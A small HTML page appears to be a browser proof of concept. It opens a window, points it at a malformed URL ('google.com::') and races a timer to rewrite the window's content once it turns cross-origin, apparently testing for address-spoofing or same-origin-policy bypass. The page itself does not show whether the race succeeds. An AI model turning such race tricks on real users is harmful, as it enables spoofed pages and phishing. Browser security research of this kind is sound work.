<!DOCTYPE html>
<html>
<body>

<button onclick="run()">go</button>

<script>
function run() {
  let w = window.open();

  // Step 1: start with controlled content
  w.document.write("<h1>Loading...</h1>");
  w.document.close();

  // Step 2: navigate to weird URL
  setTimeout(() => {
    w.location.href = "google.com::";
  }, 50);

  // Step 3: race + take back control
  let t = setInterval(() => {
    try {
      // once cross-origin or error happens, this throws
      w.location.href;
    } catch (e) {
      clearInterval(t);

      // overwrite content again
      try {
        w.document.open();
        w.document.write("<h1>nope</h1>");
        w.document.close();
      } catch (err) {
        console.log("Blocked:", err);
      }
    }
  }, 1);
}
</script>

</body>
</html>
